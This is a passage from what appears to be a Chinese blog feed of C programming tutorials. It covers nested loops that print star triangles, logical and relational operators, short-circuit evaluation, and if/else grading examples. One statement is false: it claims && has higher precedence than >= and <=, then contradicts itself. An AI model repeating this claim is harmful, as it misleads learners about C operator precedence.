class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>此时i再自增到6,不满足条件,外层循环结束,至此,整个嵌套循环彻底结束.</p><h3 id="例子2-左右对称的等腰三角形">例子2-左右对称的等腰三角形</h3><h4 id="题目">题目</h4><p>输出一个高度为5的左右对称的等腰三角形,要求使用循环,输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    *</span><br><span class="line">   ***</span><br><span class="line">  *****</span><br><span class="line"> *******</span><br><span class="line">*********</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析-代码">分析&amp;代码</h4><p>从例子1我们可以有所体会—我们需要推导出每个循环应该执行的次数(甚至需要考虑从哪个值到哪个值).</p><p>这个例子就更进一步,需要我们推出更复杂的式子(没复杂到哪去),我们来考虑,这回按照写代码的思路来引导各位.</p><p>1.首先依旧,我们需要输出5行,秉承着一行一行处理的思路,我们仍然选择开一个循环,让i从0~4进行控制这5行,那么我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.假设我们已经开始处理第i行—也就是已经开始了某一次循环(注意,这里说的是某一次,而不是第一次,读者去考虑).</p><p>那么我们观察图形,第0行需要1个’*’,第1行需要3个’*’,第2行需要5个’*’,…那么我们就能推出公式:</p><p><code>第 i 行需要 2*i+1 个'\*'</code></p><p>那么很显然,我们需要这样,同时不要忘了最后的换行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i,k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.我们运行测试一下,结果发现全部居左了:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930001507386.png" alt="image-20230930001507386" style="zoom:33%;" /></p><p>​问题很容易发现,我们忘记在每一行开头输出特定数量的空格<code>' '</code>了.</p><p>4.那么同样去观察规律,同理很容易得出:</p><p>​<code>如果一共有i行(从0开始计数),那么第j行需要i-j行</code></p><p>例如,我们一共有4行(从0开始计数),那么第2行(也就是图像的第三行)需要4-2也就是2个空格</p><p>这样代码就需要补全为这样(注意每次外层循环中,要先进行空格的输出,然后才是’*'的输出):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么到现在,我们的程序就完成了.</p><h3 id="例子3-任意高度的等腰三角形">例子3-任意高度的等腰三角形</h3><h4 id="题目">题目</h4><p>同样如例子2,输出一个左右对称的等腰三角形;</p><p>要求输入一个正整数n,输出高度为n的等腰三角形.</p><p>同样要求使用循环,输入输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line">     *</span><br><span class="line">    ***</span><br><span class="line">   *****</span><br><span class="line">  *******</span><br><span class="line"> *********</span><br><span class="line">***********</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析">分析</h4><p>处理过例子2,这个题很简单,只需要把之前的常量4(代表五行输出—从0开始计数)改为我们输入的变量n即可.</p><p>我们加入一个输入n.</p><p>我们之前的<code>for (i = 0; i &lt; 5; i++)</code>变为<code>for (i = 0; i &lt; n; i++)</code></p><p><code>for (k = 0; k &lt; 2 * i + 1; k++)</code>不变</p><p><code>for (j = 0; j &lt; 4 - i; j++)</code>变为<code>for (j = 0; j &lt; n - 1 - i; j++)</code></p><p>注意,这里之所以写<code>n-1-i</code>而不是<code>n-i</code>,是因为我们输入的是图像的高度,而代码中我们从0开始计数!所以需要减1!</p><h4 id="代码">代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为n的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, k, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外,我们发现需要4个变量,未免有点多余,实际上我们仅需要3个:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为n的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span> * i + <span class="number">1</span>; j++) &#123; <span class="comment">// 这里也使用j</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以能这么写,是因为内层的两个循环是平行的,就这个程序而言,互不影响,因为两个for都需要再开始前进行<code>j=0</code>,所以,我们把原来的k换成j即可.</p><h2 id="其他各种嵌套">其他各种嵌套</h2><p>这里仅仅写一下结构,事实上,完全没有必要,因为实际编程中完全是我们想怎么写,或者说需要怎么写,我们就按照自己的想法去写即可,完全没有任何限制.</p><p>因为,嵌套就是一个语句内有其他语句,并没有规定两者间的联系,你甚至可以在一个<code>do...while()循环</code>中嵌套一个<code>switch语句</code>,完全没有任何问题.</p><p>我们可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;<span class="keyword">while</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">if</span>(...)&#123;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面仅仅举了两个任意的框架作为例子而已,实际上随意,而且并不是一个循环中只能套一个循环,你可以放入任意数量/排列的语句(包括<code>复合语句</code>)</p><p>而且,我们还可以进行3层嵌套,4层嵌套…只要不超出编译器允许的范围…当然,一般嵌套层数超过了4,你可能就需要重新考虑你的代码结构了…因为他不仅看起来不美观,而且往往效率极低…</p><br><p>到此,我们介绍了跳转控制和嵌套的基本思路,具体的掌握还需要各位多去练习,例如上网随便找<code>C语言练习100题</code>之类的,一搜一大把.</p><p align=right>---WAHAHA 2023.9.29</p><br><br><p>上一篇:<a href="../20236c790fce4667">c语言教程-7-选择执行</a></p><p>下一篇:<a href="../2023a60ec9bcedd8">C语言教程-9-运算符及其优先级和求值顺序</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码</title>
      <link href="/20235ca27d3d86ce/"/>
      <url>/20235ca27d3d86ce/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-6-选择执行</title>
      <link href="/20237a3f77e5bcf7/"/>
      <url>/20237a3f77e5bcf7/</url>
      
        <content type="html"><![CDATA[<p>我们已经知道了最基本的程序如何进行顺序执行,但是,几乎所有实际有用的程序都会有条件判断,甚至会<code>根据不同的条件执行不同的代码</code>.</p><p>那么如果程序中需要进行条件判断,进而选择不同的路径进行执行(即执行一部分代码,同时忽略另一部分代码),我们就需要语言支持<code>选择流程控制</code>.</p><p>我们来学习C语言是如何实现<code>条件判断</code>和<code>选择控制</code>的.</p><h1 id="前置知识">前置知识</h1><h2 id="什么是真-什么是假">什么是真,什么是假</h2><p>不像其他语言,C语言(包括C++)十分简单粗暴:<code>0是假,只要不是0,那么就都是真</code></p><p>这句话隐含一个非常的事情—那就是C语言中所有的值都可以用于判断,也就是说,不像其他语言有类似bool这样专门的类型,C语言只要是任何一个表达式,都可以用于逻辑判断,并且,即使是逻辑表达式,其结果也只会使普通的1(真)或0(假).</p><p>那么问题来了:</p><p>1.默认情况下,0是假,1是真,那么2,3,4,5这样的数是真还是假呢?</p><p>​答案是<code>真</code>!因为<code>非0即为真</code>,只要不是整数0,那么都是真值,同理,一个浮点数1.1也是<code>真</code>.</p><p>2.最重要的一个问题,也是最容易忽略的一个问题,像-1,-2,-3这样的负数是真还是假呢?</p><p>​答案也是<code>真</code>!因为<code>非0即为真</code>,负数怎么可能等于0呢?那不就是<code>真</code>的嘛.</p><h2 id="p-align-right-wahaha-2023-9-22-p"><p align=right>—WAHAHA,2023.9.22</p></h2><h3 id="逻辑运算符">逻辑运算符</h3><p>很显然,逻辑运算符用于进行逻辑判断,其构成的逻辑表达式返回1(成立)或0(不成立)这两个整数中的某一个.</p><p>这里简单的介绍一下,非常简单.</p><p>逻辑运算符有3种—与或非,分别是<code>&amp;&amp;</code>,<code>||</code>和<code>!</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&amp;&amp;`就是`与`的意思,例如`a&amp;&amp;b`要求a和b必须都是真的,整个表达式才是真的</span><br><span class="line"></span><br><span class="line">`||`就是`或`的意思,例如`a||b`要求a和b只要有一个是真的,整个表达式就是真的</span><br><span class="line"></span><br><span class="line">!就是`非`的意思,他只有一个操作数,例如`!a`就是对a取反,如果`a`为真,那么`!a`就是`假`;如果`a`为假,那么`!a`就是`真`</span><br></pre></td></tr></table></figure><p>以上的a和b都是表达式,无论复杂度多高,只要是一个合法的表达式即可</p><p>并且,虽然非0即为真,但是作为逻辑运算符,其结果一定是1或0</p><h4 id="重点-短路效应">重点:短路效应</h4><p>同时,<code>&amp;&amp;</code>和<code>||</code>还有一个非常非常重要的特性,那就是<code>短路</code></p><p>1.对于<code>a&amp;&amp;b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是假的了,那么对b求值已经无所谓了,因为整个表达式势必是假,所以C编译器没有必要再费功夫去计算b,则直接返回假(0),这个现象叫做<code>短路与</code></p><p>2.对于<code>a||b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是真的了,那么对b求值已经无所谓了,因为整个表达式势必是真,所以C编译器没有必要再费功夫去计算b,则直接返回真(1),这个现象叫做<code>短路或</code></p><p>短路效应应该很好理解,可以理解为,如果前一个表达式已经足以说明最终的结果了,那么就没有必要再去计算后面的表达式,从效果上看就好像后面的表达式被<code>短路</code>了一样.</p><h4 id="注意事项">注意事项</h4><p>同时,必须注意的一点是:所谓的短路,指的是完全不进行求值,而不是求值后无效果!</p><p>之所以要说明这一点的原因是:任何表达式都可以作为逻辑运算符的运算对象,而并不是所有的表达式运算后都没有任何影响的.</p><p>例如,我们之前讲解的赋值运算符,如<code>a=3</code>,这将给a赋一个新值3,但是实际上,这个效应可以理解为对<code>a=3</code>这个表达式进行求值的<code>副作用</code>,因为<code>a=3</code>不仅仅只是给a赋值那么简单,他要返回一个值,而这个值就是=左边的a的值.</p><p>那么既然<code>a=3</code>也会返回一个值,那么他就有权利成为<code>&amp;&amp;</code>或者<code>||</code>的运算对象—3代表<code>真</code>,如果这个表达式作为第二个表达式,如果他被计算,那么a就会被覆盖为3,但是如果他被短路了,那么<code>a=3</code>就根本不会被计算(求值),进而a仍然保留原值.</p><p>如果上述的结果并不是你想要的,那么这就是一个严重的逻辑错误,因为a的值很可能在判断的过程中就已经被破坏了!!!</p><p>这个问题十分重要,同时提前引入了<code>表达式的副作用</code>这个重要概念,相关的讲解将会在后续讲解<code>运算符</code>和<code>求值顺序</code>等相关知识时进行详细的讲解!</p><h3 id="关系运算符">关系运算符</h3><p>比起逻辑运算符,关系运算符可能更容易一点,说简单点,就是比大小.</p><p>他们同样返回1或0.下图截取自<a href="https://www.runoob.com/cprogramming/c-operators.html">菜鸟教程</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924195636312.png" alt="image-20230924195636312" style="zoom: 50%;" /></p><p>注意,<code>==</code>运算符需要两个<code>=</code>,而非一个<code>=</code>,这与一些语言并不相同.一个<code>=</code>在C语言中是<code>赋值运算符</code>.</p><h1 id="什么是选择执行">什么是选择执行</h1><p>大多数问题的求解中不可能只出现一种情况,甚至是在运算过程中必然出现需要选择的情况,此时,我们就需要根据当前的情况(也就是分支条件)选择一条适当的部分进行执行,而忽略另外的部分.</p><p>例如,我们的问题是<code>输出2个数a,b中的最大值</code>,这就面临一个最简单的选择:究竟是a大还是b大,显然,如果a大则输出a,如果b大则只会输出b. C语言的选择语句就是为了处理这种情况所设计.</p><h1 id="if选择语句">if选择语句</h1><p>所有的高级语言都有流程控制语句的实现,而且目前主流的几种语言的语法都是相似的.</p><p>C语言中,使用<code>if...else if...else语句</code>进行选择控制.需要提出的一点是,这里所说的语句和标准表述的不同,但是为了更好地理解,这里把他们整合为一个大的语句.</p><p>该语句的结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//代码块1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//代码块2</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//代码块3</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(...)&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(代码块n)&#123;</span><br><span class="line"><span class="comment">//代码块n</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//代码块n+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的一点是,上面说的各个表达式,实际上可以是任何表达式(返回值的),因为使用了关系运算符和逻辑运算符的条件,实际上也是表达式,因为他们返回1或0这两种逻辑值,所以用于逻辑判断是没有问题的.</p><p>一般情况下,我们确实仅仅将逻辑表达式放进去,但是后续我们会看到一些更&quot;高级&quot;/&quot;抽象&quot;的写法.</p><p>if语句对<code>括号()</code>中的<code>表达式</code>进行<code>求值</code>,对应到包含有关系运算符和逻辑运算符的<code>表达式</code>自然就是判断条件.</p><p>其中,可以看出<code>else if()&#123;&#125;</code>的数量从逻辑上并没有任何限制(但是编译器有最大限制,基本用不到那么多的分支),编译器允许我们的数量足够我们使用.<code>else if()&#123;&#125;</code>的用途是,如果我们在<code>if()</code>中的条件(表达式1)并不符合,我们可以继续判断其他的条件,依次判断,直到确定进入一个<code>else if()&#123;&#125;</code>中.</p><p>同理,<code>else&#123;&#125;</code>用于如果<code>if()&#123;&#125;</code>和所有的<code>else if()&#123;&#125;</code>都不满足条件,那么将会执行else中的<code>代码块n+1</code>.</p><p>另一方面,除了第一个<code>if()&#123;&#125;</code>是必须有且仅有一个,其他所有的<code>else if()&#123;&#125;</code>和必须放在最后的<code>else&#123;&#125;</code>都是可有可无的,他们是否存在取决于你的代码是否需要这么多平行的条件.</p><p>讲了这么多理论,理解力强的朋友可能已经懂了,但是为了清楚说明,还是要举几个例子.</p><h2 id="示例">示例</h2><h3 id="菜单选择">菜单选择</h3><p>写一个程序,输入1,2,3中的一个数,分别输出&quot;hello&quot;,“good”,“great”,如果输入的不是1,2,3中的任何数,则输出&quot;sorry&quot;.</p><p>代码很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;great&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以尝试运行一下.其中,<code>else&#123;&#125;</code>即用于处理<strong>除了1,2,3以外任何输入的值</strong>!</p><h3 id="成绩评级">成绩评级</h3><p>输入一个0~100的整数作为成绩,</p><p>如果大于等于90,评为A;</p><p>如果大于等于80且小于90,评为B;</p><p>如果大于等于60且小于80,评为C;</p><p>如果小于60,评为D.</p><p>这里的判断要用到关系运算符(也就是比大小):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span> &amp;&amp; score &lt; <span class="number">90</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">80</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">60</span> &amp;&amp; score &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;错误,必须为0~100的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="讲解">讲解</h3><p>从<code>成绩评级</code>这个程序中,我们可以看到,我们使用了一个较为复杂的表达式,用于限定score变量的范围,我们使用了<code>&lt;=</code>和<code>&gt;=</code>来界定,同时使用<code>&amp;&amp;</code>来连接这两个子表达式.</p><p>必须注意的是,<code>&amp;&amp;</code>的<code>优先级</code>比<code>&gt;=</code>和<code>&lt;=</code>高,这意味着先判断<code>&lt;=</code>和<code>&gt;=</code>,然后才会把两个判断的结果<code>&amp;&amp;</code>起来.</p><p>依旧,有关<code>优先级</code>的知识将会放在后面进行讲解.</p><p>另一方面,我们加入了<code>score&lt;=100</code>和<code>score&gt;=0</code>的判断,用于处理错误输入—这意味着我们意识到运行该程序的人可能输入一个错误的值来测试我们的程序.</p><p>如果我们只关心问题的求解,而不去关心一些可能出现的异常情况,那么一旦出现一些误输入,甚至是故意而为之,我们的程序就会给出错误的结果,甚至崩溃.</p><p>这里的多一步判断,实际上加强了该程序的<code>健壮性</code>,也就是说,这个程序能一定程度上处理一些错误操作,而不会发生错误.</p><p>作为程序的编写者,不要指望使用程序的人(甚至是我们自己)有多么高明,他可能会不小心输入各种错误信息,或者会故意输入错误的信息,此时,就需要你去进行良好的处理.</p><p>​</p><h1 